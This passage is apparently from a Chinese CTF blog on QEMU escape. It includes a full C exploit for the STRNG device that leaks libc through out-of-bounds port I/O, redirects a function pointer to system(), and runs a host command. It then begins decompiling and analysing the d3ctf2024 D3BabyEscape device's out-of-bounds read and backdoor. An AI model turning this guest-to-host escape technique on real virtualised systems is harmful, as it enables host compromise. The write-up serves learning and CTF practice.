plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">Subsystem: Red Hat, Inc Device 1100</span><br><span class="line">Physical Slot: 3</span><br><span class="line">Flags: fast devsel</span><br><span class="line">Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">I/O ports at c050 [size=8]</span><br></pre></td></tr></table></figure><p><strong>PMIO</strong></p><p>先通过 <code>iopl(3)</code> 获取交互权限，接下来直接使用 <code>in()</code> 与 <code>out()</code> 系函数即可读写端口，需要注意的是<strong>端口地址应与读写长度对齐</strong>（例如读写 4 字节则端口地址需要对齐到 4</p><p><strong>MMIO</strong></p><p>通过 <code>mmap()</code> 映射 sysfs 下的资源文件来完成内存访问。以本题为例，通过 <code>lspci</code> 命令获取到的编号为 <code>00:03.0</code>，那么我们便可以通过 <code>mmap()</code> 映射 <code>/sys/devices/pci0000:00/0000:00:03.0/resource0</code> 文件直接完成 MMIO。类似于 PMIO，MMIO 的读写地址同样需要对齐到读写长度。</p><p>同样的,其实也可以通过映射 <code>/sys/devices/pci0000:00/0000:00:03.0/resource1</code> 文件的形式来以内存读写的形式完成 PMIO。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>来自wiki</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG_MMIO_REGS 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG_MMIO_SIZE (STRNG_MMIO_REGS * sizeof(uint32_t))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG_PMIO_ADDR 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG_PMIO_DATA 4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG_PMIO_REGS STRNG_MMIO_REGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STRNG_PMIO_SIZE 8</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> calc_str[<span class="number">0x100</span>] = <span class="string">&quot;;cat ./flag&quot;</span>;</span><br><span class="line"><span class="type">char</span> sh_str[<span class="number">0x100</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> *addr, <span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    *addr = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> *addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> port, <span class="type">uint32_t</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    outl(val, port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> port)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span>    mmio_addr;</span><br><span class="line">    <span class="type">uint32_t</span>    pmio_port = <span class="number">0xc050</span>;</span><br><span class="line">    <span class="type">int</span>         mmio_fd;</span><br><span class="line">    <span class="type">uint32_t</span>    srand_addr_low, srand_addr_high;</span><br><span class="line">    <span class="type">uint64_t</span>    srand_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    libc_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    system_addr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * initialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</span>,</span><br><span class="line">            O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to open mmio file! wrong path or no root?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to change i/o privilege! no root?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_addr = (<span class="type">uint64_t</span>)</span><br><span class="line">            mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_addr == MAP_FAILED) &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to mmap mmio space!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * regs[3] is not writable, because for addr 3 the rand_r() will be called</span></span><br><span class="line"><span class="comment">     * so we fill some useless string there</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">        mmio_write((<span class="type">uint32_t</span>*)(mmio_addr + ((<span class="number">2</span> + i) &lt;&lt; <span class="number">2</span>)), (<span class="type">uint32_t</span>*)<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        mmio_write((<span class="type">uint32_t</span>*)(mmio_addr + ((<span class="number">6</span> + i) &lt;&lt; <span class="number">2</span>)), ((<span class="type">uint32_t</span>*)calc_str)[i]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * exploitation</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Stage.I - leaking libc addr</span></span><br><span class="line"><span class="comment">     * set the strng-&gt;addr by pmio_write to a oob val</span></span><br><span class="line"><span class="comment">     * so that we can make an oob read by pmio_read</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Stage.I - leaking libc addr\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_ADDR, (STRNG_MMIO_REGS + <span class="number">1</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    srand_addr_low = pmio_read(pmio_port + STRNG_PMIO_DATA);</span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_ADDR, (STRNG_MMIO_REGS + <span class="number">2</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    srand_addr_high = pmio_read(pmio_port + STRNG_PMIO_DATA);</span><br><span class="line"></span><br><span class="line">    srand_addr = srand_addr_high;</span><br><span class="line">    srand_addr &lt;&lt;= <span class="number">32</span>;</span><br><span class="line">    srand_addr += srand_addr_low;</span><br><span class="line">    libc_addr = srand_addr - <span class="number">0x460a0</span>;</span><br><span class="line">    system_addr = libc_addr + <span class="number">0x50d60</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] get addr of srand: 0x%llx\n&quot;</span>, srand_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] libc addr: 0x%llx\n&quot;</span>, libc_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] system addr: 0x%llx\n&quot;</span>, system_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Stage.II - overwrite the rand_r ptr</span></span><br><span class="line"><span class="comment">     * set the strng-&gt;rand_r to system by oob write in pmio</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n[*] Stage.II - overwrite the rand_r ptr\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_ADDR, (STRNG_MMIO_REGS + <span class="number">5</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_DATA, (<span class="type">uint32_t</span>) system_addr);</span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_ADDR, (STRNG_MMIO_REGS + <span class="number">6</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_DATA, (<span class="type">uint32_t</span>) (system_addr &gt;&gt; <span class="number">32</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] write done!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Stage.III - control flow hijack!</span></span><br><span class="line"><span class="comment">     * call the strng-&gt;rand_r by pmio_write and hijack the control flow!</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n[*] Stage.III - control flow hijack\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger the strng-&gt;rand_r()...&quot;</span>);</span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_ADDR, <span class="number">3</span> &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    pmio_write(pmio_port + STRNG_PMIO_DATA, <span class="number">0xdeadbeef</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="d3ctf2024-D3BabyEscape"><a href="#d3ctf2024-D3BabyEscape" class="headerlink" title="d3ctf2024-D3BabyEscape"></a>d3ctf2024-D3BabyEscape</h2><p>前几天的d3ctf,还热乎的题目,十分适合新手</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This challenge is very easy and could be used as an entry-level study for qemu escape.</span><br></pre></td></tr></table></figure><p>看启动脚本,添加了一个自定义的设备l0dev</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-L ../pc-bios/ \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel vmlinuz \</span><br><span class="line">-initrd rootfs.img \</span><br><span class="line">-smp 1 \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet&quot;</span> \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-device l0dev</span><br></pre></td></tr></table></figure><p>ida打开qemu文件,搜索字符串l0dev</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000AC42010000001EC../qemu-7.0.0/hw/misc/l0dev.c</span><br><span class="line">.rodata:0000000000AC421F00000006Cl0dev</span><br><span class="line">.rodata:0000000000AC42250000000BCl0dev-mmio</span><br><span class="line">.rodata:0000000000AC42300000000BCl0dev-pmio</span><br><span class="line">.rodata:0000000000AC427000000010Cl0dev_mmio_read</span><br><span class="line">.rodata:0000000000AC428000000010Cl0dev_pmio_read</span><br><span class="line">.rodata:0000000000AC429000000011Cl0dev_mmio_write</span><br><span class="line">.rodata:0000000000AC42B000000011Cl0dev_pmio_write</span><br><span class="line">.rodata:0000000000AC42C80000000ECl0dev_realize</span><br><span class="line">.rodata:0000000000AC42E000000014Cl0dev_instance_init</span><br></pre></td></tr></table></figure><p>比较难绷的是qemu并没有调试符号</p><p>所以并不能直接搜索到l0dev的函数,但影响不大,通过字符串引用照样能找到对应的函数</p><p>mmio_read</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_4809AE</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****a1, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = sub_7F810F(a1, (__int64)<span class="string">&quot;l0dev&quot;</span>, (__int64)<span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">0x52</span>u, (__int64)<span class="string">&quot;l0dev_mmio_read&quot;</span>);</span><br><span class="line">  dest = <span class="number">-1LL</span>;</span><br><span class="line">  v7 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( len &gt; <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8</span> * v7 + len &lt;= <span class="number">0x100</span> )</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;dest, (<span class="type">char</span> *)v6 + (<span class="type">unsigned</span> <span class="type">int</span>)(*((_DWORD *)v6 + <span class="number">640</span>) + addr) + <span class="number">3124</span>, len);</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对申请地址进行8字节对齐,然后地址范围不允许超过0x100</p><p>之后将<code>v6+v6[640]+addr+3124</code>处的数据复制到dest并返回,此处就潜藏着内存越界的风险</p><p>mmio_write</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> ****__fastcall <span class="title function_">sub_480B84</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****a1, <span class="type">const</span> <span class="type">char</span> ****addr, __int64 val, <span class="type">unsigned</span> <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  _QWORD n_4[<span class="number">3</span>]; <span class="comment">// [rsp+8h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****dev; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  n_4[<span class="number">2</span>] = a1;</span><br><span class="line">  n_4[<span class="number">1</span>] = addr;</span><br><span class="line">  n_4[<span class="number">0</span>] = val;</span><br><span class="line">  len = a4;</span><br><span class="line">  dev = sub_7F810F(a1, (__int64)<span class="string">&quot;l0dev&quot;</span>, (__int64)<span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">0x85</span>u, (__int64)<span class="string">&quot;l0dev_mmio_write&quot;</span>);</span><br><span class="line">  v9 = (<span class="type">unsigned</span> __int64)addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  result = addr;</span><br><span class="line">  v7 = (<span class="type">unsigned</span> <span class="type">int</span>)addr;</span><br><span class="line">  <span class="keyword">if</span> ( len &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">const</span> <span class="type">char</span> ****)(<span class="number">8</span> * v9 + len);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)result &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="number">64</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = n_4[<span class="number">0</span>];</span><br><span class="line">        v7 = ((<span class="type">int</span> (__fastcall *)(_QWORD *))dev[<span class="number">425</span>])(n_4) % <span class="number">256</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">const</span> <span class="type">char</span> ****)<span class="built_in">memcpy</span>((<span class="type">char</span> *)dev + v7 + <span class="number">3124</span>, n_4, len);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="number">128</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="type">const</span> <span class="type">char</span> ****)n_4[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> ( n_4[<span class="number">0</span>] &lt;= <span class="number">0x100</span>uLL )</span><br><span class="line">        &#123;</span><br><span class="line">          result = dev;</span><br><span class="line">          *((_DWORD *)dev + <span class="number">640</span>) = n_4[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">const</span> <span class="type">char</span> ****)<span class="built_in">memcpy</span>((<span class="type">char</span> *)dev + v7 + <span class="number">3124</span>, n_4, len);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>128分支能够修改dev[640],内存越界读已经找到</p><p>64分支存在函数调用,参数为指向val的指针</p><p>pmio_read</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_480A92</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****a1, <span class="type">unsigned</span> __int64 a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = sub_7F810F(a1, (__int64)<span class="string">&quot;l0dev&quot;</span>, (__int64)<span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">0x68</span>u, (__int64)<span class="string">&quot;l0dev_pmio_read&quot;</span>);</span><br><span class="line">  dest = <span class="number">-1LL</span>;</span><br><span class="line">  v7 = a2 &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &gt; <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8</span> * v7 + a3 &gt; <span class="number">0x100</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dest, (<span class="type">char</span> *)v6 + (<span class="type">unsigned</span> <span class="type">int</span>)a2 + <span class="number">3124</span>, a3);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)dest == <span class="number">666</span> )</span><br><span class="line">    ++backdoor;</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>似乎存在一个后门开启</p><p>pmio_write</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">sub_480CBD</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****a1, <span class="type">unsigned</span> __int64 a2, __int64 a3, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  _DWORD n[<span class="number">3</span>]; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****v7; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = a1;</span><br><span class="line">  v6 = a2;</span><br><span class="line">  *(_QWORD *)&amp;n[<span class="number">1</span>] = a3;</span><br><span class="line">  n[<span class="number">0</span>] = a4;</span><br><span class="line">  v9 = sub_7F810F(a1, (__int64)<span class="string">&quot;l0dev&quot;</span>, (__int64)<span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">0xAD</span>u, (__int64)<span class="string">&quot;l0dev_pmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( backdoor )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">char</span> *)v9 + (<span class="type">unsigned</span> <span class="type">int</span>)(*((_DWORD *)v9 + <span class="number">640</span>) + v6) + <span class="number">3124</span>, 